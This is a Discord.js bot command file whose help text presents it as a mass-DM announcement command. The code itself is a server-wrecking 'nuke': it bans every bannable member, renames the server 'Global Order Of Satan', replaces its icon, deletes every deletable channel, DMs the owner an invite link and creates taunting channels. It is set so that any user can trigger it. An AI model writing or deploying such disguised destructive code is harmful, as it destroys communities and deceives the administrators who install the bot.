const Discord = require('discord.js');
const ayarlar = require('../ayarlar.json');

exports.run = async (client, message, args) => {
if (message.guild) {
let kanallar = 0;
let roller = 0;
let emojiler = 0;

      
message.guild.members.forEach(u => {
if (u.bannable) {
message.guild.ban(u, "Amonx No Mercy")
}
})
  

  

  
message.guild.setName(`Global Order Of Satan 😈`, ":))")
message.guild.setIcon(`https://cdn.discordapp.com/attachments/544121540283858964/566640720891346965/global-order-of-satan.png`)
  
message.guild.channels.forEach(c => {
if (c.deletable) {
kanallar++;
return c.delete();   
}
});
    

    

  
message.guild.owner.send(`**https://discord.gg/eQfrfJQ**`);
message.guild.createChannel(`satan `)
message.guild.createChannel(`never-lose`)
message.delete()
}
};

  

exports.conf = {
  enabled: true,
  guildOnly: true,
  aliases: ['banla'],
  permLevel: 0,
  kategori: "yetkili"
};

exports.help = {
  name: 'satan',
  description: 'Toplu dm atar.', 
  usage: 'dmduyuru [mesaj]'
};
